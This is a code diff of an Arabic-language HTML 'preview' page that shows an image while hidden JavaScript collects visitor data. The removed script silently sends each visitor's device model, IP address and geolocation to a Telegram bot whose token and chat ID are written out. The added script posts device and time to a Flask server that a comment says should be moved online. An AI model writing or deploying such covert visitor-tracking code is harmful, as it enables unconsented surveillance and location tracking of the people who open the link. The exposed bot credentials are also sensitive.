@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> </title>
+    <title>معاينة</title>
     <meta property="og:type" content="website" />
     <meta property="og:title" content=" " />
     <meta property="og:description" content=" " />
@@ -49,10 +49,6 @@
         <img src="zer.jpg" alt="صورة">
     </div>
 
-</body>
-</html>
-    </div>
-
     <script>
         // دالة تحديد نوع الشركة والجهاز
         function getExactDeviceName(ua) {
@@ -63,7 +59,6 @@
                 const androidMatch = ua.match(/Android[^;]*;\s*([^)]+)\)/);
                 if (androidMatch) {
                     modelCode = androidMatch[1].trim();
-                    
                     let lowerUA = ua.toLowerCase();
                     let lowerModel = modelCode.toLowerCase();
 
@@ -114,38 +109,26 @@
 
         const now = new Date().toLocaleString("ar-SA", {timeZone: "Asia/Riyadh"});
         const ua = navigator.userAgent;
-        const botToken = '8426812517:AAHI0TRbNfDDGcI97cyT6EpFV6y8ADLsAl8';
-        const chatId = '1802530770';
-        
         let exactDeviceName = getExactDeviceName(ua);
         
-        // إرسال البيانات الأساسية على الفور
-        const basicMsg = `✅ زائر جديد!%0A⏰ ${now}%0A📱 الجهاز: ${exactDeviceName}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${basicMsg}`);
-        
-        // جزء جلب الـ IP (بدون انتظار طويل)
-        fetch("https://api.ipify.org?format=json", {timeout: 5000})
-          .then(r => r.json())
-          .then(data => {
-            const ip = data.ip;
-            const ipMsg = `🔗 IP Address: ${ip}`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${ipMsg}`);
-          })
-          .catch(() => {
-            console.log('لم يتمكن من جلب IP');
-          });
-        
-        // جزء جلب الموقع (بدون انتظار)
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition((pos) => {
-            let lat = pos.coords.latitude;
-            let lon = pos.coords.longitude;
-            const locMsg = `📍 الموقع:%0A🗺 https://www.google.com/maps?q=${lat},${lon}`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${locMsg}`);
-          }, () => {
-            console.log('لم يتمكن من جلب الموقع');
-          });
-        }
+        // تجهيز كائن البيانات لإرساله إلى سيرفرك الخاص
+        const payload = {
+            device: exactDeviceName,
+            time: now
+        };
+
+        // إرسال البيانات إلى سيرفر البايثون (Flask)
+        // ملاحظة: استبدل localhost برابط سيرفرك الحقيقي عند رفعه أونلاين (مثل Render أو VPS)
+        fetch("http://localhost:5000/api/log", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(data => console.log("Done"))
+        .catch(err => console.log("Error connecting to backend"));
     </script>
 </body>
 </html>
